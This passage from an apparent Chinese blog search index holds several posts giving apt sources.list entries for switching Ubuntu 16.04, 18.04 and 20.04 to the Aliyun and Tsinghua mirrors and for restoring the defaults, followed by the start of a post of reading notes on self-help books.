http://security.ubuntu.com/ubuntu/ xenial-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ xenial-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ xenial-security universe\ndeb http://security.ubuntu.com/ubuntu/ xenial-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ xenial-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像","url":"/mirror/ubuntu-16-04-tuna-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ xenial main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial universe\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial universe\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial multiverse\ndeb http://archive.ubuntu.com/ubuntu/ xenial-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ xenial-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu xenial partner\n# deb-src http://archive.canonical.com/ubuntu xenial partner\n\ndeb http://security.ubuntu.com/ubuntu/ xenial-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ xenial-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ xenial-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ xenial-security universe\ndeb http://security.ubuntu.com/ubuntu/ xenial-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ xenial-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像","url":"/mirror/ubuntu-18-04-aliyun-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ bionic main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic universe\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic universe\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic multiverse\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu bionic partner\n# deb-src http://archive.canonical.com/ubuntu bionic partner\n\ndeb http://security.ubuntu.com/ubuntu/ bionic-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ bionic-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security universe\ndeb http://security.ubuntu.com/ubuntu/ bionic-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像","url":"/mirror/ubuntu-18-04-tuna-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ bionic main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic universe\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic universe\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic multiverse\ndeb http://archive.ubuntu.com/ubuntu/ bionic-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu bionic partner\n# deb-src http://archive.canonical.com/ubuntu bionic partner\n\ndeb http://security.ubuntu.com/ubuntu/ bionic-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ bionic-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security universe\ndeb http://security.ubuntu.com/ubuntu/ bionic-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ bionic-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像","url":"/mirror/ubuntu-20-04-aliyun-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\ndeb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse\n\ndeb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\ndeb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ focal main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ focal main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal universe\n# deb-src http://archive.ubuntu.com/ubuntu/ focal universe\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal multiverse\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu focal partner\n# deb-src http://archive.canonical.com/ubuntu focal partner\n\ndeb http://security.ubuntu.com/ubuntu/ focal-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ focal-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security universe\ndeb http://security.ubuntu.com/ubuntu/ focal-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","aliyun","阿里","阿里云","阿里云镜像","国内源","阿里源","开源","开源软件","开源软件镜像","Ubuntu","trusty"]},{"title":"【国内镜像】Ubuntu 20.04 LTS focal 清华镜像","url":"/mirror/ubuntu-20-04-tuna-mirror/","content":"\nUbuntu，是一款基于 Debian Linux 的以桌面应用为主的操作系统，内容涵盖文字处理、电子邮件、软件开发工具和 Web 服务等，可供用户免费下载、使用和分享。\n\n## 替换镜像源\n\n\n```txt /etc/apt/sources.list\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n\n# 预发布软件源，不建议启用\n# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse\n```\n\n<!-- more -->\n\n## 恢复\n\n\n```txt /etc/apt/sources.list\n# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to\n# newer versions of the distribution.\ndeb http://archive.ubuntu.com/ubuntu/ focal main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ focal main restricted\n\n## Major bug fix updates produced after the final release of the\n## distribution.\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates main restricted\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates main restricted\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team. Also, please note that software in universe WILL NOT receive any\n## review or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal universe\n# deb-src http://archive.ubuntu.com/ubuntu/ focal universe\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates universe\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates universe\n\n## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu\n## team, and may not be under a free licence. Please satisfy yourself as to\n## your rights to use the software. Also, please note that software in\n## multiverse WILL NOT receive any review or updates from the Ubuntu\n## security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal multiverse\ndeb http://archive.ubuntu.com/ubuntu/ focal-updates multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-updates multiverse\n\n## N.B. software from this repository may not have been tested as\n## extensively as that contained in the main release, although it includes\n## newer versions of some applications which may provide useful features.\n## Also, please note that software in backports WILL NOT receive any review\n## or updates from the Ubuntu security team.\ndeb http://archive.ubuntu.com/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src http://archive.ubuntu.com/ubuntu/ focal-backports main restricted universe multiverse\n\n## Uncomment the following two lines to add software from Canonical's\n## 'partner' repository.\n## This software is not part of Ubuntu, but is offered by Canonical and the\n## respective vendors as a service to Ubuntu users.\n# deb http://archive.canonical.com/ubuntu focal partner\n# deb-src http://archive.canonical.com/ubuntu focal partner\n\ndeb http://security.ubuntu.com/ubuntu/ focal-security main restricted\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security main restricted\ndeb http://security.ubuntu.com/ubuntu/ focal-security universe\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security universe\ndeb http://security.ubuntu.com/ubuntu/ focal-security multiverse\n# deb-src http://security.ubuntu.com/ubuntu/ focal-security multiverse\n```\n\n<!-- more -->\n\n## 相关链接\n\n- https://developer.aliyun.com/mirror/ubuntu\n- https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/\n- [【国内镜像】Ubuntu 14.04 LTS trusty 阿里云镜像](/mirror/ubuntu-14-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 阿里云镜像](/mirror/ubuntu-16-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 阿里云镜像](/mirror/ubuntu-18-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 阿里云镜像](/mirror/ubuntu-20-04-aliyun-mirror/)\n- [【国内镜像】Ubuntu 14.04 LTS trusty 清华镜像](/mirror/ubuntu-14-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 16.04 LTS xenial 清华镜像](/mirror/ubuntu-16-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 18.04 LTS bionic 清华镜像](/mirror/ubuntu-18-04-tuna-mirror/)\n- [【国内镜像】Ubuntu 20.04 LTS focal 清华镜像](/mirror/ubuntu-20-04-tuna-mirror/)\n\n\n","categories":["国内镜像"],"tags":["mirror","镜像","Linux","国内镜像","镜像站","国内源","开源","开源软件","开源软件镜像","tuna","清华","清华镜像","清华源","Ubuntu","trusty"]},{"title":"读书笔记（一）","url":"/reading-notes/001/","content":"\n## 《秒赞》林桂枝\n\n1.你的样子里，有你走过的路，读过的书，看过的风景。\n\n2.想当垃圾吃垃圾，想当辣椒吃辣椒，想当什么自己要想好吃什么。\n\n- 创建“好东西”文件夹，在里面放好的设计与照片、出色的演讲、有见地的文章、有趣的事物。\n- 准备一个“好东西”本子，随时记录有趣的对话和文字，补充新词汇，不断丰富自己的储备。\n- 将自己认为“有感觉”的词汇记下来，接着将这些词汇分给不同的人和不同的事物，想想这些词该给谁，与什么东西结合最有意思。\n- 读完一本书，写个简短的读书心得；看完一部电影，记录自己的感受。有时间多写，忙的话写几行字也可以。\n- 你记录的点点滴滴将会成为你个人的宝贵资产，你的缪斯女神，更是让你工作顺利、表现优秀的利器。\n\n3.人能想象到的一切都是真实的。——毕加索\n\n<!-- more -->\n\n---\n\n## 《财务自由之路 I》博多·舍费尔\n\n1.我将生活简化为5个领域：健康、财务、关系、情感和人生意义。5个领域都同等重要。\n\n2.为什么人们想在短期内变得富有？因为他们想获得足够的能为他们服务的金钱。因为他们想拥有一台赚钱机器，而非穷其一生当一台赚钱机器。因为他们想拥有足够的资金，以过上一种收支平衡的生活。\n\n3.你的事业建立在你最大的爱好之上。用你的爱好来赚钱。花点时间分析一下，你真正感兴趣的是什么、你的才能在哪方面，之后你才有可能从事一份自己既感兴趣又能赚钱的工作。\n\n4.责任这个单词在英语中叫作“responsibility”，在这个单词中隐藏着另外两个单词“response”（回应）和“ability”（技巧）。因此，责任这一词用英语来解释就是：有技巧地进行回应。以争吵应对争执，以冲突应对挑衅，绝非最佳的问题解决方式。\n\n5.如果提的问题是“谁来负责任”，那我们就是在寻找借口。当我们说“你负有责任”时，将事情引向积极方向的机会就消失了。而且，这个关于责任的问题还会将我们一直引向过去。正确的提问应该是：“在当时谁应该对此负责？”但你现在不能拓宽你当时的可控领域，所以需要将精力运用在当下。我们提出的问题也应该以当下为中心：我们现在能做些什么？\n\n6.日记本是空白的书籍，是你可以自己写作的书籍，专属于你个人。每个人都应该每天写自己的成功日记，记录下当天所有的成功事件：你获得的每一次夸奖和每一次认可，无论是你遵守纪律，完成一项任务，还是你使某人快乐。…… 